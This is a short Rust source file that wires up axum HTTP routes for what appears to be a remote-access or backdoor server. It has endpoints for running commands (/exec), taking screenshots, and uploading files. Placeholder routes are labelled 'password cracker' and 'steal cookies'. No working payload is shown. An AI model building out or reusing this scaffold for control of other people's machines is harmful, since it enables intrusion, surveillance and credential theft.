mod exec;
mod file;
mod scrn;

use crate::ShellState;
use axum::{
    routing::{get, post},
    Extension, Router,
};
use std::sync::{Arc, Mutex};

pub fn all_routes(shellpath: Arc<Mutex<ShellState>>) -> Router {
    Router::new()
        .route("/", get("login with username and password"))
        .route("/set", get("update username & password"))
        .route("/pswd", post("password cracker"))
        .route("/exec", post(exec::exec_cmd))
        .route("/file/audio", post(file::post_audio))
        .route("/file/image", post(file::post_image))
        .route("/file/pdf", post(file::post_pdf))
        .route("/file/video", post(file::post_video))
        .route("/file/zip", post(file::post_zip))
        .route("/scrn", post(scrn::screenshot))
        .route("/cookie", post("steal cookies"))
        .layer(Extension(shellpath))
}
